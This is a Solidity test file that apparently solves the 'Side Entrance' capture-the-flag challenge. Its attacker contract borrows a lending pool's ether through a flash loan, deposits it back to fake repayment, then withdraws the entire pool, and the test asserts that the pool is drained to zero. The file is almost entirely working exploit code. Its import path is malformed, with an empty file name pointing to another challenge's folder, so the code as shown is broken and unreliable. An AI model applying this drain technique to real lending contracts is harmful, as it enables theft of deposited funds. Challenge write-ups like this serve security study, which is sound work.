// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "../the-rewarder/.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool sideEntranceLenderPool;
    uint256 etherInPool;

    constructor(address poolAddress, uint256 totalEther) {
        sideEntranceLenderPool = SideEntranceLenderPool(poolAddress);
        etherInPool = totalEther;
    }
    
    function execute() external payable {
        sideEntranceLenderPool.deposit{value: etherInPool}();
    }

    
    function attack() external {
        sideEntranceLenderPool.flashLoan(etherInPool);
        sideEntranceLenderPool.withdraw();
    }
    
    receive() external payable {}
}

contract SideEntranceTest is DSTest {
    SideEntranceLenderPool sideEntranceLenderPool;

    uint256 etherInPool = 1000 ether;

    function setUp() public {
        sideEntranceLenderPool = new SideEntranceLenderPool();
	
        sideEntranceLenderPool.deposit{value: etherInPool}();
    }

    function testSideEntrance() public {
        SideEntranceAttacker attacker = new SideEntranceAttacker(address(sideEntranceLenderPool), etherInPool);
        
        attacker.attack();

        require(address(attacker).balance == etherInPool, "Balance of this should equal the amount of tokens in the pool.");
        require(address(sideEntranceLenderPool).balance == 0, "Balance of the pool should equal 0.");
    }
}
